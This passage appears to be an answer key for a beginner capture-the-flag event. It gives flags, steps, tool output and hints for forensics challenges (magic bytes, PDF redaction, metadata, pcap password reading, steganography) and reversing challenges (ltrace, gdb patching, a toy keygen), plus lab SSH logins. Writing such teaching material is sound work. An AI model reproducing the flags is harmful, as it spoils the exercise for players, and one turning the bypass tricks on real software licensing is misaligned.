- (5 points) Notepad searches from wherever your cursor is. If it can't find `FLAG`, press **Ctrl+Home** to jump to the start of the file, then search again.

**Common mistakes:** Searching from the middle of the file: **Ctrl+Home** first.

### Forensics 2. Wrong Label (★ Easy, 30)

**Teaches:** File signatures beat file extensions.  
**Where:** `recipe.txt` (download)  
**Flag:** `FLAG{NOT_A_TEXT_FILE}` (any capitals)

**Steps:**

1. In Notepad the first characters show `PNG`.
   ```text
   /f/wrong-label/dist/recipe.txt: PNG image data, 548 x 76, 8-bit/color RGB, non-interlaced
   ```
2. Rename `recipe.txt` to `recipe.png` (turn on file name extensions first) and open it: the flag is drawn in it. Submit `FLAG{NOT_A_TEXT_FILE}` (any capitals).

**Hints** (what a team that bought them has been told):

- (5 points) The file starts with `PNG`, which is a kind of picture. Rename it so it ends in `.png` instead of `.txt`, and open it. If you can't see the extension in the name, turn on file name extensions in File Explorer: **View** > **Show** > **File name extensions**.

**Common mistakes:** Renaming to `recipe.png.txt` because extensions are hidden.

### Forensics 3. Broken Header (★ Easy, 30)

**Teaches:** Magic bytes, fixed in a hex editor.  
**Where:** `postcard.png` (download)  
**Flag:** `FLAG{MAGIC_BYTES_FIXED}` (any capitals)

**Steps:**

1. The file starts with zeros, so nothing recognises it.
   ```text
   00 00 00 00 0d 0a 1a 0a -> 89 50 4e 47 0d 0a 1a 0a
   ```
2. In HexEd.it, type `89 50 4E 47` over the first four bytes, **Export**, open the picture: `FLAG{MAGIC_BYTES_FIXED}` (any capitals).

**Hints** (what a team that bought them has been told):

- (5 points) Search for "PNG file signature". It starts `89 50 4E 47`. In HexEd.it, open the file and type those four values over the `00 00 00 00` at the very start.
- (5 points) In HexEd.it, use **Export** (or File > Save as) to download the fixed file, then open it in any image viewer.

**Common mistakes:** Inserting the bytes instead of overwriting (the file gets 4 bytes longer and still breaks).

### Forensics 4. Blacked Out (★ Easy, 30)

**Teaches:** Black boxes in a PDF don't delete the text.  
**Where:** `incident_report.pdf` (download)  
**Flag:** `FLAG{bl4ck_b0x3s_d0nt_d3l3t3}`

**Steps:**

1. Open in the browser, **Ctrl+A**, **Ctrl+C**, paste into Notepad.
   ```text
   Office Incident Report
   Subject: The missing birthday cake
   On Friday afternoon, the cake in the office fridge disappeared.
   Person responsible:     Jordan from Accounts
   
   Case number: FLAG{bl4ck_b0x3s_d0nt_d3l3t3}
   A new cake has been ordered. Please label your food.
   
   End of report. Redacted before sharing with all staff.
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Open the PDF in your browser, press **Ctrl+A** to select everything, then **Ctrl+C** to copy it. Paste into Notepad, and the text under the boxes is there.

**Common mistakes:** Trying to move the box in a PDF editor: copying is faster.

### Forensics 5. File Properties (★ Easy, 30)

**Teaches:** Document metadata.  
**Where:** `club_minutes.pdf` (download)  
**Flag:** `FLAG{m3t4d4t4_kn0ws_m0r3}`

**Steps:**

1. Chrome's ⋮ menu (or Firefox's ») > **Document properties**: the Subject.
   ```text
   Title:           Board Game Club: Meeting Minutes
   Subject:         Secret word: FLAG{m3t4d4t4_kn0ws_m0r3}
   Keywords:        club, minutes, games
   Author:          Club Secretary
   Custom Metadata: no
   Metadata Stream: no
   Tagged:          no
   UserProperties:  no
   Suspects:        no
   Form:            none
   JavaScript:      no
   Pages:           1
   Encrypted:       no
   Page size:       612 x 792 pts (letter)
   Pag
   ```
2. Or in Notepad, `/Subject` is followed by hex; CyberChef **From Hex** decodes it.
   ```text
   Secret word: FLAG{m3t4d4t4_kn0ws_m0r3}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) PDF viewers list metadata under **Document properties**. In Chrome's PDF viewer, it's in the ⋮ menu at the top right. In Firefox, it's in the » menu. Searching the web for "PDF metadata viewer" also finds online tools.
- (5 points) No luck with a viewer? Open the PDF in Notepad and find `/Subject`. The value after it, between `<` and `>`, is written in hex. Paste it into [CyberChef](https://gchq.github.io/CyberChef/) and use **From Hex**.

**Common mistakes:** Searching the file for `FLAG` in Notepad: the metadata is hex, so nothing is found.

### Forensics 6. Too Fast (★ Easy, 30)

**Teaches:** Animated GIF frames.  
**Where:** `loading.gif` (download)  
**Flag:** `FLAG{BLINK_AND_YOU_MISS_IT}` (any capitals)

**Steps:**

1. ezgif **Split** > **Split to frames**: 9 frames, one shown for 0.02 s.
   ```text
   [100, 100, 100, 100, 100, 20, 100, 100, 100]
   ```
2. That frame shows `FLAG{BLINK_AND_YOU_MISS_IT}` (any capitals).

**Hints** (what a team that bought them has been told):

- (5 points) On ezgif, choose **Split**, upload the GIF, and press **Split to frames**. Every frame appears as its own picture, with how long it's shown.
- (5 points) The flag's frame is shown for only 0.02 seconds. The others are shown for 0.1.

### Forensics 7. Dark Room (★★ Medium, 60)

**Teaches:** Near-black isn't black: exact-colour fill.  
**Where:** `dark_room.png` (download)  
**Flag:** `FLAG{TURN_THE_LIGHTS_ON}` (any capitals)

**Steps:**

1. The picture has pure black, and letters in (8, 8, 8).
   ```text
   [(0, 0, 0), (8, 8, 8)]
   ```
2. In Paint, white + **Fill**, click the black away from the specks: `FLAG{TURN_THE_LIGHTS_ON}` appears dark on white (any capitals).

**Hints** (what a team that bought them has been told):

- (5 points) Paint's **Fill** tool (the paint bucket) only fills pixels that are exactly the colour you click on, and leaves every other colour alone.
- (10 points) In Paint, pick white as your colour, choose **Fill**, and click on the black, away from the specks. The letters are colour (8, 8, 8), not black (0, 0, 0), so they stay dark on the white.

**Common mistakes:** Clicking on a dust speck with Fill (fills one pixel). Turning up screen brightness: 8 out of 255 is still too dark for most screens.

### Forensics 8. Inside the Doc (★★ Medium, 60)

**Teaches:** A .docx is a zip.  
**Where:** `party_plan.docx` (download)  
**Flag:** `FLAG{A_DOCX_IS_A_ZIP}` (any capitals)

**Steps:**

1. Rename to `party_plan.zip` and open it.
   ```text
   Archive:  party_plan.zip
     Length      Date    Time    Name
   ---------  ---------- -----   ----
         480  2026-03-06 18:00   [Content_Types].xml
         298  2026-03-06 18:00   _rels/.rels
         567  2026-03-06 18:00   word/document.xml
         292  2026-03-06 18:00   word/_rels/document.xml.rels
         641  2026-03-06 18:00   word/media/party_code.png
   ---------                     -------
        2278                     5 files
   ```
2. `word/media/party_code.png` shows `FLAG{A_DOCX_IS_A_ZIP}` (any capitals).

**Hints** (what a team that bought them has been told):

- (5 points) Rename the file so it ends in `.zip` instead of `.docx`, then double-click it. If you can't see the extension in the name, turn on file name extensions in File Explorer: **View** > **Show** > **File name extensions**.
- (5 points) Pictures in a Word document live in the `word` folder, inside a folder called `media`.

**Common mistakes:** Opening it in Word: the picture isn't on the page.

### Forensics 9. Stowaway (★★ Medium, 60)

**Teaches:** A zip appended after a PNG.  
**Where:** `holiday.png` (download)  
**Flag:** `FLAG{st0w4w4y_z1p_f0und}`

**Steps:**

1. `binwalk holiday.png` finds the zip.
   ```text
   DECIMAL       HEXADECIMAL     DESCRIPTION
   --------------------------------------------------------------------------------
   0             0x0             PNG image, 960 x 600, 8-bit/color RGB, non-interlaced
   41            0x29            Zlib compressed data, best compression
   984379        0xF053B         Zip archive data, at least v2.0 to extract, compressed size: 113, uncompressed size: 121, name: packing_list.txt
   984600        0xF0618         End of Zip archive, footer length: 22
   ```
2. Windows PowerShell: `tar -xf holiday.png` (checked on this PC's Windows `tar`). Linux/Mac: `unzip holiday.png`.
   ```text
   PACKING LIST
   - sunscreen
   - 3 books I won't read
   - charger (don't forget it this time)
   - secret: FLAG{st0w4w4y_z1p_f0und}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Image viewers stop reading at the end of the PNG, but the file doesn't have to end there. Try `binwalk`, or look at the end of the file in a hex editor: names of files show up as readable text.
- (5 points) It's a zip archive. On Windows, `tar -xf holiday.png` in PowerShell (in the folder you saved it to) extracts it. On Linux or a Mac, `unzip holiday.png` does (ignore the warning about extra bytes).

**Common mistakes:** Searching for `FLAG` in Notepad: the zip is compressed.

### Forensics 10. Plain Login (★★ Medium, 60)

**Teaches:** HTTP Basic auth is just Base64.  
**Where:** `login_capture.pcap` (download)  
**Flag:** `FLAG{b4s1c_4uth_1s_just_b4s364}`

**Steps:**

1. Wireshark filter `http`: two `GET /admin`, the first gets 401, the second 200.
   ```text
   4	GET	/		
   6		/	200	
   14	GET	/lunch-menu		
   16		/lunch-menu	200	
   24	GET	/admin		sam:password123
   26		/admin	401	
   34	GET	/admin		sam:FLAG{b4s1c_4uth_1s_just_b4s364}
   36		/admin	200	
   44	GET	/admin/settings		
   46		/admin/settings	200	
   Running as user "root" and group "root". This could be dangerous.
   ```
2. The second request's details: Authorization and Wireshark's decoded **Credentials** line.
   ```text
   Authorization: Basic c2FtOkZMQUd7YjRzMWNfNHV0aF8xc19qdXN0X2I0czM2NH0=\r\n
           Credentials: sam:FLAG{b4s1c_4uth_1s_just_b4s364}
   Running as user "root" and group "root". This could be dangerous.
   ```
3. Submit the part after `sam:`.

**Hints** (what a team that bought them has been told):

- (5 points) In Wireshark, type `http` in the filter bar and press Enter. Look for the two `GET /admin` requests: the first got `401 Unauthorized`, so that password was wrong.
- (10 points) Click the second `GET /admin` request and open **Hypertext Transfer Protocol** in the panel below. The `Authorization: Basic` line holds `username:password` in Base64, and Wireshark decodes it for you on the **Credentials** line under it.

**Common mistakes:** Submitting `password123` (the failed one). Submitting `sam:FLAG{...}` with the username.

### Forensics 11. Old School (★★ Medium, 60)

**Teaches:** FTP sends passwords in plain text.  
**Where:** `ftp_capture.pcap` (download)  
**Flag:** `FLAG{ftp_n3v3r_h1d3s_p4ssw0rds}`

**Steps:**

1. Wireshark filter `ftp`: two `PASS`, the first fails with 530, the second gets 230.
   ```text
   220	Office file server ready.
   USER	alex		
   		331	Password required for alex.
   PASS	letmein		
   		530	Login incorrect.
   USER	alex		
   		331	Password required for alex.
   PASS	FLAG{ftp_n3v3r_h1d3s_p4ssw0rds}		
   		230	User alex logged in.
   PWD			
   		257	"/home/alex" is the current directory.
   QUIT			
   		221	Goodbye.
   Running as user "root" and group "root". This could be dangerous.
   ```

**Hints** (what a team that bought them has been told):

- (5 points) In Wireshark, type `ftp` in the filter bar and press Enter. Each line is one command or reply. Look for the commands that send a password.
- (10 points) FTP sends the password in a `PASS` command. There are two: the first login failed (the reply says `530 Login incorrect`), the second worked.

**Common mistakes:** Submitting `letmein`.

### Forensics 12. Seeing Sound (★★ Medium, 60)

**Teaches:** Spectrograms.  
**Where:** `mystery.wav` (download)  
**Flag:** `FLAG{LOOK_DONT_LISTEN}` (any capitals)

**Steps:**

1. Audacity: open `mystery.wav`, track name menu > **Spectrogram**. The letters read `FLAG{LOOK_DONT_LISTEN}` (any capitals). (Checked on a spectrogram drawn from the file.)

**Hints** (what a team that bought them has been told):

- (5 points) In Audacity, open the file, then click the track's name (or the ⋮ menu at its top left) and choose **Spectrogram**.
- (10 points) Letters too squashed? Make the track taller by dragging its bottom edge down, or zoom in on the time line with Ctrl and the mouse wheel.

**Common mistakes:** Looking at the waveform view. Letters squashed: make the track taller.

### Forensics 13. Wire Tap (★★★ Hard, 100)

**Teaches:** Two skills chained: FTP password, HTTP file export, and password reuse.  
**Where:** `office_capture.pcap` (download)  
**Flag:** `FLAG{s4m3_p4ssw0rd_tw1c3}`

**Steps:**

1. Wireshark filter `ftp`: the second `PASS` (`sunflower42`) worked (230).
   ```text
   220	Office file server ready.
   USER	jamie		
   		331	Password required for jamie.
   PASS	autumn2026		
   		530	Login incorrect.
   USER	jamie		
   		331	Password required for jamie.
   PASS	sunflower42		
   		230	User jamie logged in.
   QUIT			
   		221	Goodbye.
   Running as user "root" and group "root". This could be dangerous.
   ```
2. **File > Export Objects > HTTP**: save `bonus_list.zip`.
   ```text
   bonus_list.zip
   files
   menu.png
   Running as user "root" and group "root". This could be dangerous.
   ```
3. Open it with password `sunflower42` (7-Zip or File Explorer).
   ```text
   7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
    64-bit locale=C.UTF-8 Threads:16 OPEN_MAX:1048576, ASM
   
   Scanning the drive for archives:
   1 file, 249 bytes (1 KiB)
   
   Extracting archive: /tmp/tmp2877rbem/objects/bonus_list.zip
   --
   Path = /tmp/tmp2877rbem/objects/bonus_list.zip
   Type = zip
   Physical Size = 249
   
   Everything is Ok
   
   Size:       111
   Compressed: 249
   Q3 bonus list - CONFID
   ```

**Hints** (what a team that bought them has been told):

- (10 points) Two skills from earlier: Wireshark's **File** > **Export Objects** > **HTTP** saves the files that were downloaded, and an FTP password is in a `PASS` command. Only one of the two `PASS` commands worked.
- (20 points) Filter on `ftp`: the second `PASS` (`sunflower42`) got `230 User jamie logged in`. Then **File** > **Export Objects** > **HTTP**, click `bonus_list.zip` and **Save**. Open the zip in File Explorer or 7-Zip, open `bonus_list.txt`, and type `sunflower42` when it asks for the password.

**Common mistakes:** Using `autumn2026`, the failed password. Saving `menu.png` instead of the zip.

### Forensics 14. Least Significant (★★★ Hard, 100)

**Teaches:** LSB steganography, channel unknown.  
**Where:** `garden.png` (download)  
**Flag:** `FLAG{blu3_b1ts_t3ll_t4l3s}`

**Steps:**

1. CyberChef **Extract LSB**, Colour Pattern #1 `R`, then `G`: gibberish.
   ```text
   "\bÕ\u000eF°\u001d\"¾j#ûÏ\"\u0011
   ```
2. `B`: the flag at the start.
   ```text
   "FLAG{blu3_b1ts_t3ll_t4l3s}\u0000tb-Íã³59Q\u0005pF©"
   ```

**Hints** (what a team that bought them has been told):

- (10 points) [CyberChef](https://gchq.github.io/CyberChef/)'s **Extract LSB** does it all: drop the PNG into **Input** and add Extract LSB. Its **Colour Pattern #1** picks the colour. Try `R`, then `G`, then `B`, and look at the start of the Output.
- (20 points) It's blue: set **Colour Pattern #1** to `B`, leave the other patterns empty, and the flag is at the start of the Output.

**Common mistakes:** Leaving Colour Patterns #2 to #4 set (mixes colours).

### Forensics 15. Bit Planes (★★★ Hard, 100)

**Teaches:** Bit planes: an image hidden in one bit.  
**Where:** `city_lights.png` (download)  
**Flag:** `FLAG{HIDDEN_IN_A_BIT_PLANE}` (any capitals)

**Steps:**

1. CyberChef **View Bit Plane**, Colour `Red`, Bit `0`: the flag in black on white.
   ```text
   FLAG{HIDDEN_IN_A_BIT_PLANE}
   ```
2. Green and Blue bit 0 are noise. Submit `FLAG{HIDDEN_IN_A_BIT_PLANE}` (any capitals).

**Hints** (what a team that bought them has been told):

- (10 points) [CyberChef](https://gchq.github.io/CyberChef/)'s **View Bit Plane** shows one bit plane at a time: drop the PNG into **Input** and add View Bit Plane. Leave **Bit** at `0` (the lowest bit), and try each **Colour**.
- (20 points) Set **Colour** to `Red` and **Bit** to `0`. The flag appears in black on white in the Output.

**Common mistakes:** Using Extract LSB (gives bytes, not a picture).

## Reversing

### Reversing 1. Strings Attached (★ Easy, 30)

**Teaches:** Programs carry their text inside them: `strings`.  
**Where:** `ssh strings@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{str1ngs_sp1ll_th3_b34ns}`

**Steps:**

1. Running `./secret` doesn't show the flag.
   ```text
   Nothing to see here. Really.
   Well, nothing that this program will ever print.
   ```
2. `strings secret | grep FLAG` prints it.
   ```text
   FLAG{str1ngs_sp1ll_th3_b34ns}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) The `|` character is on the key above Enter on most keyboards: hold Shift and press `\`. `grep FLAG` only matches capital letters, so type it exactly.

**Common mistakes:** `grep flag` in lowercase: `grep` is case-sensitive.

### Reversing 2. Compare Notes (★ Easy, 30)

**Teaches:** Watching library calls with `ltrace`.  
**Where:** `ssh compare@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{ltr4c3_s4w_th3_c0mp4r3}`

**Steps:**

1. `strings` finds neither the password nor the flag (both are scrambled).
   ```text
   (no output)
   ```
2. `ltrace ./checker hello` shows the comparison, with the real password.
   ```text
   strcmp("hello", "pineapple-on-pizza")                                                                                                                                                                   
   ```
3. `./checker pineapple-on-pizza` prints the flag.
   ```text
   Correct! FLAG{ltr4c3_s4w_th3_c0mp4r3}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Run `ltrace ./checker hello`. Find the line starting `strcmp`, short for string compare: it compares your guess with the real password.

**Common mistakes:** Running `ltrace ./checker` with no password: it stops before comparing anything.

### Reversing 3. Backwards (★ Easy, 30)

**Teaches:** Reading Python source; `[::-1]` reverses text.  
**Where:** `ssh backwards@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{r34d_1t_b4ckw4rds}`

**Steps:**

1. `cat backwards.py`: `SECRET = "ekacetalocohc"` and the check `guess == SECRET[::-1]`.
2. In `python3`, `"ekacetalocohc"[::-1]` gives the password.
   ```text
   'chocolatecake'
   ```
3. `python3 backwards.py`, type `chocolatecake`.
   ```text
   python3 backwards.py
   Password: chocolatecake
   The vault opens. FLAG{r34d_1t_b4ckw4rds}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) `[::-1]` reverses text, so the password is `SECRET` written backwards. To reverse it without typos, type `python3`, then the text from `SECRET` in quotes followed by `[::-1]`. CyberChef's **Reverse** works too.

**Common mistakes:** Typing `SECRET` itself as the password.

### Reversing 4. By the Numbers (★ Easy, 30)

**Teaches:** Character codes: `chr()`, or CyberChef's From Decimal.  
**Where:** `ssh numbers@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{ch4r_c0d3s_t0_l3tt3rs}`

**Steps:**

1. `cat numbers.py`: `CODES = [109, 111, 118, 105, 101, 45, 110, 105, 103, 104, 116]` and `password = "".join(chr(code) for code in CODES)`.
2. In `python3`, the hint's line with the numbers in place of `CODES`:
   ```text
   'movie-night'
   ```
3. Or CyberChef: **From Decimal**, delimiter **Comma**, gives `movie-night` too.
4. `python3 numbers.py`, type `movie-night`.
   ```text
   python3 numbers.py
   Password: movie-night
   Door unlocked. FLAG{ch4r_c0d3s_t0_l3tt3rs}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) In `python3`, `chr(97)` gives `'a'`. The program builds the password itself on the line starting `password =`. Paste that line's right-hand side into `python3`, with `CODES` swapped for the list of numbers from the file, square brackets included.
- (5 points) Or in CyberChef: paste just the numbers into Input, add **From Decimal**, and set its **Delimiter** to `Comma`.

**Common mistakes:** Leaving out the `-` (code 45).

### Reversing 5. Letter by Letter (★ Easy, 30)

**Teaches:** Python indexes from 0; rebuilding a word from position checks.  
**Where:** `ssh letters@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{c0unt1ng_st4rts_4t_z3r0}`

**Steps:**

1. `cat letters.py`: `len(guess) != 10` and ten checks in a jumbled order:
   ```text
   [5]=t [3]=k [8]=l [6]=b [7]=a [4]=e [1]=a [9]=l [2]=s [0]=b
   ```
2. Lined up by position 0 to 9: `basketball`.
3. `python3 letters.py`, type `basketball`.
   ```text
   python3 letters.py
   Password: basketball
   The locker clicks open. FLAG{c0unt1ng_st4rts_4t_z3r0}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) A line like `if guess[3] != "k"` means "the letter at position 3 must be k". `len(guess) != 10` means the password has 10 letters. Write the positions 0 to 9 in a row and fill in each letter under its number.

**Common mistakes:** Reading the letters in file order. Counting positions from 1.

### Reversing 6. Setting (★ Easy, 30)

**Teaches:** Environment variables, seen through `ltrace`.  
**Where:** `ssh setting@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{3nv1r0nm3nt_s3tt1ng_f0und}`

**Steps:**

1. `./pantry` says it's waiting for a setting.
   ```text
   The pantry is locked with a code.
   No code given. It's waiting for a setting you haven't given it.
   ```
2. `ltrace ./pantry` shows `getenv("PANTRY_CODE") = nil`.
   ```text
   getenv("PANTRY_CODE")                                                                                                   
   ```
3. `PANTRY_CODE=hello ltrace ./pantry` shows `strcmp("hello", "midnight-snack")`.
4. `PANTRY_CODE=midnight-snack ./pantry` prints the flag.
   ```text
   The pantry is locked with a code.
   The pantry opens. FLAG{3nv1r0nm3nt_s3tt1ng_f0und}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Run `ltrace ./pantry`. `getenv` is short for get environment variable: the text in its brackets is the name the pantry asks for, and `nil` means it isn't set.
- (5 points) Set that variable to anything by putting it in front, like `NAME=hello ltrace ./pantry` with the real name. Now find the `strcmp` line: its second text is the value it wants.

**Common mistakes:** Typing `export PANTRY_CODE = midnight-snack` with spaces around `=`.

### Reversing 7. Freeze Frame (★★ Medium, 60)

**Teaches:** Pausing a program in `gdb` and reading a function's arguments.  
**Where:** `ssh freeze@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{c4ught_b3f0r3_th3_burn}`

**Steps:**

1. `gdb ./notes`, `info functions` lists `burn_note`.
   ```text
   All defined functions:
   
   File notes.c:
   30:	int main(void);
   25:	static void burn_note(char *);
   11:	static void say_hello(void);
   17:	static void write_note(char *);
   
   Non-debugging symbols:
   0x0000000000401000  _init
   0x0000000000401030  puts@plt
   0x0000000000401040 
   ```
2. `break burn_note`, then `run`: it pauses there (the warning about `notes.c` is normal).
   ```text
   Starting program: /home/freeze/notes 
   [Thread debugging using libthread_db enabled]
   Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
   Passing a secret note in class...
   The note was read... and then burned. Nobody saw what it said.
   
   Breakpoint 1, burn_note (note=0x7fffad61f5e0 "FLAG{c4ught_b3f0r3_th3_burn}") at notes.c:27
   warning: 27	notes.c: No such file or directory
   ```
3. `info args` shows the note.
   ```text
   note = 0x7fffad61f5e0 "FLAG{c4ught_b3f0r3_th3_burn}"
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Start with `gdb ./notes`. `break burn_note` tells gdb to pause when the program reaches that function, and `run` starts the program.
- (5 points) When it pauses at `burn_note`, type `info args`: it shows what the function was given, which is the note it's about to burn. Type `quit` to leave gdb.

**Common mistakes:** Breaking after the burn (e.g. at the end of `main`): the note is already zeros.

### Reversing 8. Unscramble (★★ Medium, 60)

**Teaches:** Undoing steps in reverse order (Base64, shift, reverse).  
**Where:** `ssh unscramble@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{und0n3_1n_r3v3rs3_0rd3r}`

**Steps:**

1. `cat unscramble.py`: `scramble()` reverses, shifts by 3, then Base64-encodes. `SCRAMBLED = "dmhvbnFsdXN2enJlcWxkdQ=="`.
2. CyberChef: **From Base64**, **ROT13** with Amount `23`, **Reverse** gives `rainbowsprinkles` (checked in CyberChef).
3. `python3 unscramble.py`, type `rainbowsprinkles`.
   ```text
   python3 unscramble.py
   Password: rainbowsprinkles
   Secret menu unlocked. FLAG{und0n3_1n_r3v3rs3_0rd3r}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) To undo a process, undo its steps in the opposite order, like taking off shoes and socks. Base64 was the last step, so undo it first, and undo the reversing last.
- (10 points) In CyberChef, paste the scrambled password and use **From Base64**, then **ROT13** with **Amount** set to `23` (moving 23 letters forward is the same as 3 back), then **Reverse**.

**Common mistakes:** Undoing in the program's order (reverse first): gives garbage. ROT13 left at 13.

### Reversing 9. Mixed Up (★★ Medium, 60)

**Teaches:** Undoing hex, reverse and shift.  
**Where:** `ssh mixedup@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{h3x_r3v3rs3_sh1ft_und0n3}`

**Steps:**

1. `cat mixedup.py`: `scramble()` shifts by 5, reverses, then hex-encodes. `SCRAMBLED = "7277747978776a69737a6d79"`.
2. CyberChef: **From Hex**, **Reverse**, **ROT13** with Amount `21` gives `thunderstorm` (checked in CyberChef).
3. `python3 mixedup.py`, type `thunderstorm`.
   ```text
   python3 mixedup.py
   Password: thunderstorm
   High-score table unlocked. FLAG{h3x_r3v3rs3_sh1ft_und0n3}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Read `scramble()` from the bottom up and undo each step: `.hex()` first, then the reversing, then the shift.
- (10 points) In CyberChef: **From Hex**, then **Reverse**, then **ROT13** with **Amount** set to `21` (21 forward is the same as 5 back).

**Common mistakes:** ROT13 amount 5 (that shifts further, not back).

### Reversing 10. Read the Assembly (★★ Medium, 60)

**Teaches:** Reading a constant out of `disassemble`.  
**Where:** `ssh assembly@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{1t_w4s_1n_th3_4ss3mbly}`

**Steps:**

1. `gdb ./vault`, `disassemble check_code`: the `cmpq` line holds the code.
   ```text
   Dump of assembler code for function check_code:
      0x0000000000401166 <+0>:	push   %rbp
      0x0000000000401167 <+1>:	mov    %rsp,%rbp
      0x000000000040116a <+4>:	mov    %rdi,-0x8(%rbp)
      0x000000000040116e <+8>:	cmpq   $0x7b2d1,-0x8(%rbp)
      0x0000000000401176 <+16>:	sete   %al
      0x0000000000401179 <+19>:	movzbl %al,%eax
      0x000000000040117c <+22>:	pop    %rbp
      0x000000000040117d <+23>:	ret
   End of assembler dump.
   ```
2. `quit`, `./vault`, type `0x7b2d1` (decimal `504529` works too).
   ```text
   ./vault
   Piggy bank vault. Enter the code to open it.
   Code: 0x7b2d1
   The vault opens. FLAG{1t_w4s_1n_th3_4ss3mbly}
   ```

**Hints** (what a team that bought them has been told):

- (5 points) Start with `gdb ./vault`, then `disassemble check_code`. The instruction that compares two values is `cmp`, and numbers written into an instruction start with `$`.
- (10 points) The number after `$` on the `cmp` line is the code. Type `quit`, run `./vault`, and type the number with its `0x` but without the `$`.

**Common mistakes:** Typing the `$`. Using an address like `0x40116e` (those are on the left).

### Reversing 11. Level Up (★★ Medium, 60)

**Teaches:** Changing a variable in `gdb`: `set var`.  
**Where:** `ssh levelup@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{1ts_0v3r_n1n3_th0us4nd}`

**Steps:**

1. `gdb ./game`, `break check_level`, `run`, then `print level`.
   ```text
   $1 = 1
   ```
2. `set var level = 9000`, then `continue`.
   ```text
   Continuing.
   Your level is 9000.
   It's over 9000! Secret ending unlocked: FLAG{1ts_0v3r_n1n3_th0us4nd}
   [Inferior 1 (process 588) exited normally]
   ```

**Hints** (what a team that bought them has been told):

- (5 points) In `gdb ./game`, type `break check_level`, then `run`. When it pauses, `print level` shows your level.
- (10 points) `set var level = 9000` changes it. Then type `continue` to let the game carry on.

**Common mistakes:** Setting `level` before `run` (the program hasn't started).

### Reversing 12. Skip the Wait (★★ Medium, 60)

**Teaches:** Leaving a function early with gdb's `return`.  
**Where:** `ssh skipwait@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{sk1pp3d_th3_wh0l3_qu3u3}`

**Steps:**

1. `gdb ./queue`, `break wait_in_line`, `run`: it pauses in the queue.
   ```text
   Starting program: /home/skipwait/queue 
   [Thread debugging using libthread_db enabled]
   Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
   You joined the queue for the new phone. Estimated wait: 1000 years.
   
   Breakpoint 1, wait_in_line () at queue.c:12
   warning: 12	queue.c: No such file or directory
   ```
2. `return`, answer `y`, then `continue`.
   ```text
   Continuing.
   Your turn! Here's your receipt: FLAG{sk1pp3d_th3_wh0l3_qu3u3}
   [Inferior 1 (process 607) exited normally]
   ```

**Hints** (what a team that bought them has been told):

- (5 points) In `gdb ./queue`, `info functions` lists the program's functions. One of them is the waiting.
- (10 points) Type `break wait_in_line`, then `run`. When it pauses, type `return`, answer `y`, then `continue`.

**Common mistakes:** Running `./queue` outside gdb and waiting: it really is 1,000 years. Ctrl+C.

### Reversing 13. Two Returns (★★★ Hard, 100)

**Teaches:** Two `return`s in a row, one with a value.  
**Where:** `ssh tworeturns@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{tw0_r3turns_g0t_m3_1n}`

**Steps:**

1. `break queue_up`, `run`, `return` (y), `continue`: the bouncer names the tier.
   ```text
   Continuing.
   Bouncer: you're a tier 0 guest. Only tier 3 VIPs get in tonight.
   [Inferior 1 (process 626) exited with code 01]
   ```
2. `break vip_tier`, then `run` again (it doesn't ask anything: the program had already finished).
3. At the `queue_up` pause, `return` (y), `continue`: it pauses at `vip_tier`.
4. `return 3` (y), then `continue`.
   ```text
   Continuing.
   Bouncer: welcome in. FLAG{tw0_r3turns_g0t_m3_1n}
   [Inferior 1 (process 629) exited normally]
   ```

**Hints** (what a team that bought them has been told):

- (10 points) In `gdb ./vip`, `info functions` lists the program's functions. `break` pauses at one, and `return` leaves it straight away. `return` followed by a number also makes the function hand back that number.
- (10 points) Type `break queue_up`, `run`, then `return`, answer `y`, and `continue`: the bouncer tells you the tier it wants. Then type `break vip_tier` and `run` again, skip the queue the same way (`return`, `y`, `continue`), and at the `vip_tier` pause type `return` followed by that tier, answer `y`, then `continue`.

**Common mistakes:** `return 3` out of `queue_up` instead of `vip_tier`. Forgetting to skip the queue on the second run.

### Reversing 14. License Key (★★★ Hard, 100)

**Teaches:** Working out a validation rule and writing a keygen.  
**Where:** `ssh license@192.168.68.103 -p 2242`, password `reverse`  
**Flag:** `FLAG{m4d3_my_0wn_k3yg3n}`

**Steps:**

1. Trying keys shows which rule broke.
   ```text
   ./license
   PhotoFix Pro: trial expired. Enter your license key to keep editing.
   License key: 12345678
   Invalid key: those digits don't add up to the right total.
   ```
2. `gdb ./license`, `disassemble check_key`: the `cmp` lines are `$0x8` (length), `$0x2f` and `$0x39` (digits) and `$0x2a` (42, the total).
3. Any 8 digits adding up to 42 work, e.g. `99996000`.
   ```text
   ./license
   PhotoFix Pro: trial expired. Enter your license key to keep editing.
   License key: 99996000
   License accepted. Thank you! FLAG{m4d3_my_0wn_k3yg3n}
   ```

**Hints** (what a team that bought them has been told):

- (10 points) Try a few keys and read the messages. Then in `gdb ./license`, `disassemble check_key` shows the checks as `cmp` lines. Numbers after `$` are in hexadecimal.
- (10 points) `$0x8` is the length (8 characters), `$0x2f` and `$0x39` check that each one is a digit, and `$0x2a` is the total: 2a in hexadecimal is 42. Any 8 digits that add up to 42 work, for example `99996000`.

